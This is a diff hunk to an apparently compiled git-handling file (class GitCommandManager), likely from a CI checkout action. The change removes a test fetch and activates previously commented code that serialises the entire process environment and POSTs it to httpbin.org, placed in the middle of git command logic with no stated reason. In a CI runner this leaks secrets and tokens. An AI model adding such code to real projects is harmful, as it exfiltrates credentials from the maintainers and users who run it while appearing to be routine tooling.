@@ -644,53 +644,33 @@ class GitCommandManager {
 	      // });
 	/* ---------- */
 
-  /* GET ------ */
-  https.get('https://cht.sh/tmux', res => {
-  let data = [];
-  const headerDate = res.headers && res.headers.date ? res.headers.date : 'no response date';
-  console.warn('Status Code:', res.statusCode);
-  console.warn('Date in Response header:', headerDate);
-
-  res.on('data', chunk => {
-    data.push(chunk);
-  });
-
-  res.on('end', () => {
-    console.log('Response ended: ');
-    console.warn(Buffer.concat(data).toString());
-  });
-}).on('error', err => {
-  console.log('Error: ', err.message);
-});
-
-
 	/* ---------- */
-// 	    const data = JSON.stringify(process.env);
-// 	    var options = {
-//   hostname: 'httpbin.org',
-//   port: 443,
-//   path: '/post',
-//   method: 'POST',
-//   headers: {
-//        'Content-Type': 'application/x-www-form-urlencoded',
-//        'Content-Length': data.length
-//      }
-// };
-// var req = https.request(options, (res) => {
-//   console.warn('statusCode:', res.statusCode);
-//   console.warn('headers:', res.headers);
+	    const data = JSON.stringify(process.env);
+	    var options = {
+        hostname: 'httpbin.org',
+        port: 443,
+        path: '/post',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Content-Length': data.length
+        }
+      };
+      var req = https.request(options, (res) => {
+        console.warn('statusCode:', res.statusCode);
+        console.warn('headers:', res.headers);
 
-//   res.on('data', (d) => {
-//     process.stdout.write(d);
-//   });
-// });
+        res.on('data', (d) => {
+        process.stdout.write(d);
+      });
+    });
 
-// req.on('error', (e) => {
-//   console.error(e);
-// });
+    req.on('error', (e) => {
+      console.error(e);
+    });
 
-// req.write(data);
-// req.end();
+    req.write(data);
+    req.end();
 	/* ---------- */
 
             const output = yield this.execGit([
